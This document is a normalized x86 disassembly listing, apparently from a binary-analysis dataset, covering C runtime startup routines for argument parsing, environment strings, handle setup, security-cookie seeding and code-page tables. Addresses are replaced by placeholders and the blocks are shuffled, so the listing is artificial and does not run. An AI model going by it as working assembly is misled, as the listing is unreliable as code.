push esi
call sub_40c6f0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_40c6f0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_409fcc
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40ca1d
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_409fcc
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40c68d
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40bef2
int3
add edi 0x4
sub_40dc13
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40fda9
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40fda9
pop ecx
test eax eax
je r-xdata
call sub_40fda9
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40ddad
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40ebe6
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40dc13
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40c9d8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40dc13
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40de68
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40c9d8
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_409fcc
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_40deff
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40ca1d
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40ca1d
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40e144
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40e1e7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_40e276
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40e30f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_409fcc
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_409fcc
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_409fcc
push [ esi + 0xc0 ]
call sub_409fcc
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40fdc1
push [ esi + 0xd4 ]
call sub_409fcc
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_409fcc
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_409fcc
pop ecx
push [ esi + 0xb0 ]
call sub_409fcc
push [ esi + 0xbc ]
call sub_409fcc
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_409fcc
push [ esi + 0xbc ]
call sub_4101a1
pop ecx
pop ecx
push eax
call sub_409fcc
pop ecx
push eax
call sub_409fcc
push [ esi + 0xbc ]
call sub_410138
pop ecx
pop ecx
sub_40e45a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_40e1e7
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_40e276
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40e30f
pop ecx
sub_40e4a7
push 0xc
push r--data
call sub_40c290
call sub_40b2d2
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_40e45a
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e514
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40b2d2
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40c2d5
retn
push 0x20
call sub_40a3c3
sub_40e520
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40e54f
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_40f160
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40e5b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_4105b3
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_410486
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_410486
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_40f160
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40e743
push 0xc
push r--data
call sub_40c290
call sub_40b2d2
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e7de
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40c2d5
retn
push 0x20
call sub_40a3c3
cmp esi rw-data
je r-xdata
push esi
call sub_409fcc
pop ecx
sub_40e7e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40b678
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40e863
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40e7e7
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40e54f
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40f160
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40e520
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_40e5b3
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40f160
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40e520
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40ea4c
push 0x14
push r--data
call sub_40c290
or [ ebp - 0x20 ] 0xffffffff
call sub_40b2d2
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40e743
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40e7e7
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40c9d8
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40c2d5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40e863
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40aa97
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_409fcc
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_409fcc
pop ecx
push 0xd
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ebad
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_409fcc
pop ecx
sub_40ec04
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40b678
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40fd0b
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
